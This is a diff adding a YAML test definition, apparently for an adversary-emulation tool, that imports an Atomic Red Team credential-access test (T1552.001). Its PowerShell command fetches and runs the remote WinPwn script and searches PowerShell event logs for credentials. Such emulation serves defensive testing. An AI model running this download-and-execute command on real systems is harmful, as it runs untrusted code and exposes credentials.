@@ -1,0 +1,27 @@
+- id: 75f66e03-37d3-4704-9520-3210efbe33ce
+  name: WinPwn - powershellsensitive
+  description: Check Powershell event logs for credentials or other sensitive information
+    via winpwn powershellsensitive function.
+  tactic: credential-access
+  technique:
+    attack_id: T1552.001
+    name: 'Unsecured Credentials: Credentials In Files'
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          powershellsensitive -consoleoutput -noninteractive
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - t1552.001
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2020-02-04T12:52:13.006Z'
+    atomic_guid: 75f66e03-37d3-4704-9520-3210efbe33ce
+    import_timestamp: '2025-06-24T11:15:06.721767Z'
